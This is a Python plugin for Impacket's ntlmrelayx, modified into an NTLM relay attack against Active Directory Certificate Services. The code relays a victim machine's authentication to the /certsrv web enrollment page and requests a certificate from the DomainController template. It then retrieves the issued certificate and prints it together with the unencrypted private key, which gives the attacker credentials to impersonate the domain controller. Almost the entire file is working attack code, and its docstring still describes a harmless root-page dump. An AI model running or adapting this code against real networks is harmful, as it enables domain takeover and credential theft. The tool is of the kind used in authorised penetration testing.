# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  HTTP protocol relay attack
#
# ToDo:
#
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
import http.client, urllib.parse
import re
PROTOCOL_ATTACK_CLASS = "HTTPAttack"
# Cache already attacked clients
ELEVATED = []

class HTTPAttack(ProtocolAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]
    def run(self):

        # Generate a key
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        # Generate a CSR
        csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([
            # Modify domain name, also modify for relaying users instead of computer accounts
            x509.NameAttribute(NameOID.COMMON_NAME, u"{0}.testsegment.local".format(self.username[:-1])),
        ])).sign(key, hashes.SHA256(), default_backend())

        # Get the cert from the ADCS server
        pem_req = csr.public_bytes(serialization.Encoding.PEM)

        # print(pem_req.decode('utf-8'))
        print('Performing certifiate request attack')
        data = {
            'Mode': 'newreq',
            'CertRequest': pem_req.decode('utf-8'),
            # Modify for template name
            'CertAttrib': 'CertificateTemplate:DomainController',
            'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36',
            'FriendlyType': 'Saved-Request Certificate (6/19/2021, 5:07:31 PM)',
            'ThumbPrint': '',
            'TargetStoreFlags': 0,
            'SaveCert': 'yes'
        }
        params = urllib.parse.urlencode(data)
        headers = {
            "Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/html"
        }
        if self.username in ELEVATED:
            print('Skipping user %s since attack was already performed' % self.username)
            return
        self.client.request("POST", "/certsrv/certfnsh.asp", params, headers)
        ELEVATED.append(self.username)

        r1 = self.client.getresponse()
        # print(r1.status, r1.reason)
        data1 = r1.read().decode('utf-8')
        if 'Certificate Issued' in data1:
            print('Cert issued OK!')
            # print(data1)
            req_id = re.search(r"certnew.cer\?ReqID=(\d+)&", data1).group(1)
            self.client.request("GET", "/certsrv/certnew.cer?ReqID={0}&Enc=b64".format(req_id))
            r2 = self.client.getresponse()
            data2 = r2.read().decode('utf-8')
            # print(data2)
            print('Got signed cert for {0}!'.format(self.username))
            # Print the key and the cert
            pem_key = key.private_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PrivateFormat.TraditionalOpenSSL,
                        encryption_algorithm=serialization.NoEncryption(),
            )

            print("Cert:\n{}".format(data2))
            print("Key:\n{}".format(pem_key.decode()))

        #Remove protocol from target name
        #safeTargetName = self.client.target.replace('http://','').replace('https://','')

        #Replace any special chars in the target name
        #safeTargetName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', safeTargetName)

        #Combine username with filename
        #fileName = re.sub(r'[^a-zA-Z0-9_\-\.]+', '_', self.username.decode('utf-16-le')) + '-' + safeTargetName + '.html'

        #Write it to the file
        #with open(os.path.join(self.config.lootdir,fileName),'w') as of:
        #    of.write(self.client.lastresult)
